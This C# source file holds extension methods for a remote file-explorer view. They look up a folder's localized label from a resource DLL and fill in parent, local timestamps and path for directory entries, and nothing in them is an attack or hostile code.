using System;
using System.IO;
using System.Text;
using Orcus.Administration.Commands.Native;
using Orcus.Shared.Commands.FileExplorer;

namespace Orcus.Administration.Commands.FileExplorer
{
    public static class EntryExtensions
    {
        private const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
        private const uint LOAD_LIBRARY_AS_DATAFILE = 0x00000002;

        //http://archives.miloush.net/michkap/archive/2007/01/18/1487464.html
        public static string GetLabel(this PackedDirectoryEntry directory)
        {
            if (directory.LabelId != 0 && !string.IsNullOrEmpty(directory.LabelPath))
            {
                var dllPath = Environment.ExpandEnvironmentVariables(directory.LabelPath);
                var hMod = NativeMethods.LoadLibraryEx(dllPath, IntPtr.Zero,
                    DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_AS_DATAFILE);
                if (hMod != IntPtr.Zero)
                {
                    try
                    {
                        var sb = new StringBuilder(500);
                        if (NativeMethods.LoadString(hMod, directory.LabelId, sb, sb.Capacity) != 0)
                            return sb.ToString();
                    }
                    finally
                    {
                        NativeMethods.FreeLibrary(hMod);
                    }
                }
            }

            if (!string.IsNullOrEmpty(directory.Label))
                return directory.Label;

            return directory.Name;
        }

        public static T Unpack<T>(this T fileExplorerEntry, DirectoryEntry parent) where T : IFileExplorerEntry
        {
            fileExplorerEntry.Parent = parent;
            fileExplorerEntry.LastAccess = fileExplorerEntry.LastAccess.ToLocalTime();
            fileExplorerEntry.CreationTime = fileExplorerEntry.CreationTime.ToLocalTime();
            if (string.IsNullOrEmpty(fileExplorerEntry.Path))
            {
                if (parent != null)
                {
                    fileExplorerEntry.Path = Path.Combine(parent.Path, fileExplorerEntry.Name);
                }
                else
                {
                    fileExplorerEntry.Path = fileExplorerEntry.Name;
                }
            }

            return fileExplorerEntry;
        }
    }
}